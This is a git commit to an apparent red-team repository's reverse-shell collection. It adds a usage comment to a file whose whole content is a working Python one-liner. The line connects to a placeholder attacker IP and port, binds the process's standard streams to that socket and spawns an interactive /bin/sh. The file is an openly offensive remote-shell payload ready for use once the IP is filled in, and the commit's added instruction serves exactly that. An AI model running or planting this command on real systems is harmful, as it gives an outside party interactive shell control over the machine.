e104e90c4e1f9edc56ea6e387be4c87cb1631bd2
Matt T <85061655+Mattluna@users.noreply.github.com>
2026-09-22 08:55:17 -0400

    Update reverse shell script with usage instructions
    Added instructions for replacing IP and port in reverse shell script.

--- Red_team/Reverse_Shells/python.py
+++ Red_team/Reverse_Shells/python.py
@@ -1,4 +1,4 @@
-
+# Replace {IP} with your IP and set port to your listening port
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{Port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
